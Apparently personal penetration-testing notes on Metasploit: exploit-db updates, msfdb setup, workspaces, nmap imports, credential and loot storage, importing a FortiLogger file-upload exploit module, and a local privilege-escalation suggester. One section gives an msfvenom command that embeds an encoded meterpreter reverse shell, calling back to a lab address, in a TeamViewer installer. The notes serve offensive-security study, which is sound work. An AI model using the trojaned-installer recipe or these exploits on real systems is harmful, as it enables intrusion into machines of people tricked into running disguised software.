# Update exploit database

```sh
sudo searchsploit -u
sudo apt update && sudo apt install exploitdb -y
```

# Post-exploit

Too lazy to write

TODO: elaborate

```
msf6 > sessions -h
```

```
msf6 > jobs -h
```

# `msfdb`

Metasploit can use Postgresql to store stuffs. Enable it will give you the ability to store nmap result, suggest exploits based on it, store pwned credentials, loots like hashes, etc

```sh
sudo apt update && sudo apt install exploitdb -y
sudo systemctl enable --now postgresql
sudo msfdb init
sudo msfdb run
```

## If bug, re-init

```sh
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

## Basics
>"Every" commands used here, you can add `-h` to get help

Database

```
msf6 > help database
```

Workspace

```
msf6 > workspace -h

# Add workspace "Target_1"
msf6 > workspace -a Target_1

# Switch to workspace "Target_1"
msf6 > workspace Target_1

# Delete workspace "Target_1"
msf6 > workspace -d Target_1
```

## `nmap`

Import `nmap` result

```sh
nmap -oX nmap.xml $target
```

```
msf6 > db_import nmap.xml
msf6 > hosts
msf6 > services
```

Or, `nmap` inside `msfconsole`, it automatically saves into the db

```
msf6 > db_nmap -sV -sS 10.10.10.8
```

## DB export

```
msf6 > db_export -f <format, xml or pwdump> [filename]
```

## Creds

For the love of god there are just too much

```
msf6 > creds -h
```

## Loots

```
msf6 > loots -h
```

# Import custom modules

```sh
searchsploit 'fortilogger'   
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
FortiLogger 4.4.2.2 - Unauthenticated Arbitrary File Upload (Metasploit)     | multiple/webapps/49600.rb
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

`searchsploit` searches from exploit-db, so the FortiLogger 4.4.2.2 exploit file can be copied like this:

```sh
# Easiest way
curl https://www.exploit-db.com/raw/49600 -o ~/.msf4/modules/exploits/windows/http/fortilogger_file_upload.rb --create-dirs
# Or, get the exploit's path and copy to metasploit custom modules path
searchsploit -p 49600
mkdir -p ~/.msf4/modules/exploits/windows/http
cp <paste the path> ~/.msf4/modules/exploits/windows/http/fortilogger_file_upload.rb
```

Then in `msfconsole`, reload like this

```
msf6> loadpath ~/.msf4/modules/
```

Or, the brainless way:

```
msf6> reload_all
```
# Inject payload into legit binary

`msfvenom` can inject a payload into a legit executable. It injects directly the shellcode into legitimate executable and run the shellcode as another thread

Here are the `msfvenom` flags that you need to know:

```
-x, --template        <path>     Specify a custom executable file to use as a template
-k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
```

Example

```sh
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
# Privesc suggestion

```sh
background
use post/multi/recon/local_exploit_suggester
set session 1
run
```